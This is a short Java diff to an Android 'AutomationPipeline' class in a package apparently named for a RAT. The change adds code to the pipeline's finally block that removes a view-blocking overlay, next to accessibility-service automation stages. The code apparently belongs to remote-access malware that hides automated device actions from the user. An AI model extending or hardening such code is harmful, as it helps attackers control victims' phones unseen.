@@ -2,6 +2,7 @@ package com.vendor.rat.auto.pipeline;
 
 import android.util.Log;
 import com.vendor.rat.auto.pipeline.stage.*;
+import com.vendor.rat.helper.BlockViewHelper;
 import com.vendor.rat.service.MyAccessibilityService;
 import java.util.ArrayList;
 import java.util.Arrays;
@@ -143,11 +144,20 @@ public class AutomationPipeline {
                     new RemoveOverlayStage(),
                     new MarkCompletedStage()
                 )
-                .andFinally(() -> {
-                    currentContext = null;
-                    long elapsed = System.currentTimeMillis() - start;
-                    Log.i(TAG, "=== Pipeline END (" + elapsed + "ms) ===");
-                })
+         .andFinally(() -> {
+         // Safety net: ensure overlay is removed even if pipeline fails
+  try {
+     if (BlockViewHelper.isShowing()) {
+      Log.w(TAG, "Overlay still showing after pipeline, removing as safety net");
+      BlockViewHelper.removeViewInternal();
+       }
+        } catch (Exception e) {
+        Log.e(TAG, "Failed to remove overlay in finally", e);
+   }
+         currentContext = null;
+     long elapsed = System.currentTimeMillis() - start;
+       Log.i(TAG, "=== Pipeline END (" + elapsed + "ms) ===");
+     })
                 .thenReturn();
 
         }, "automation-pipeline").start();
